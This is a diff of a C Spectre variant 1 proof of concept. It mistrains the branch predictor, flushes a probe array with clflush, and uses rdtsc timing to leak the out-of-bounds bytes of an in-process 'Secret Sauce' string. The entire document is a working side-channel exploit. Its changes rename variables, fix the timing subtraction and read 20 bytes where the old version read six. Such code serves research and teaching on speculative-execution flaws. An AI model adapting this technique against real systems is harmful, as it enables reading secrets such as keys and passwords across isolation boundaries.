@@ -6,18 +6,19 @@
 
 #define CACHE_PAGE 128
 #define COUNT 100
-#define SECRET 16
+#define SECRET_S 16
 #define TRAIN 50
 #define FREQ 10
 
 
-volatile char  secret[SECRET*16] = "\0\0\0\0" "\0\0\0\0" "\0\0\0\0" "\0\0\0\0" "SECRET";
+volatile char  secret[SECRET_S*16] = 
+"\0\0\0\0" "\0\0\0\0"
+"\0\0\0\0" "\0\0\0\0"
+"Secret Sauce";
 
-volatile uint32_t cache_detector[256 * CACHE_PAGE];
-volatile uint32_t secret_s = SECRET;
+volatile uint8_t detector[256 * CACHE_PAGE];
+volatile uint32_t secret_s = SECRET_S;
 volatile uint32_t detector_s = 256 * CACHE_PAGE;
-
-int x;
 
 void sink(uint32_t x){
     (void)x;
@@ -32,53 +33,52 @@ void delay(){
     }
 }
 
-void get_from_secret(int idx){
+int x;
+void get_from_secret(int idx){ //Vulnerable Function-------------------------
     if(idx < secret_s){
-       x = x ^ cache_detector[secret[idx]*CACHE_PAGE];
+       x = x ^ detector[secret[idx]*CACHE_PAGE];
     }
 
 }
 
-uint32_t check_single_timing(int idx, int byte){
-    for(int i = 0; i < 256; i++){
-        _mm_clflush((void*)(cache_detector + i * CACHE_PAGE));
-        delay();
+uint32_t check_timing(int idx, int byte){
+    for(int i = 0; i < 256; i++) {
+        _mm_clflush((void*)(detector + i * CACHE_PAGE));
     }
     
-    for(int i=0; i<TRAIN;i++){
-        _mm_flush((void*)&secret_s);
-        delay();
+    int idx_ = idx % secret_s;
 
+for(int i = 0; i < TRAIN; i++) {
+    _mm_clflush((void*)&secret_s);
+    delay();
 
-        //to avoid branch predictor
-        int idx_ = i % secret_s;
-        int addr = ((i % FREQ)-1) & ~0xffff;
-        addr = (addr | (addr >> 16));
-        addr = idx_ ^ (addr & (idx_ ^ idx));
+    int addr = ((i % FREQ) - 1) & ~0xffff;
+    addr = (addr | (addr >> 16));
+    addr = idx_ ^ (addr & (idx_ ^ idx));
 
-        get_from_secret(addr);
+    get_from_secret(addr); //Replace With Vulnerable Function
+  }
 
-    }
+    delay();
 
-    
+  uint64_t a, b;
+  byte *= CACHE_PAGE;
 
-    _mm_lfence();
-    uint64_t a,b;
-    byte *= CACHE_PAGE;
-    a = __rdtsc();
-    sink(cache_detector[byte]);
-    _mm_lfence();
-    b = __rdtsc();
-    return (uint32_t)(a - b);
+  a = __rdtsc();
+  sink(detector[byte]);
+  _mm_lfence();
+  b = __rdtsc();
+
+  return (uint32_t)(b - a);
 }
 
-uint32_t check_all_timing(int idx, int byte){
+uint32_t check_location(int idx, int byte){
     uint32_t ram = 0;
     uint32_t cache = 0;
     
 
-    for(int i = 0; i < (int)COUNT; i++){
-        uint32_t timing = check_single_timing(idx, byte);
+    for(int i = 0; i < COUNT; i++){
+        uint32_t timing = check_timing(idx, byte);
         if(timing > 80){ram++;}else{cache++;}
     }
     if(cache > ram){return 1;}
@@ -90,16 +90,19 @@ uint8_t getByte(int idx){
     uint8_t character = 0;
 
     for(int i = 'A'; i <= 'Z'; i++){
-        if(check_all_timing(idx, i)==1){
-            return i;
+        if(check_location(idx, i)==1){
+            character = i;
         }
     }
+
+    return character;
 
 }
 
 int main(void){
-    for(int i = 0;i < 6; i++){
-        printf("%c",getByte(secret_s + i));
+    int btr = 20;
+    for(int i = 0;i < btr; i++){
+        putchar(getByte(secret_s + i));
     }
     printf("\n");
     return 0;
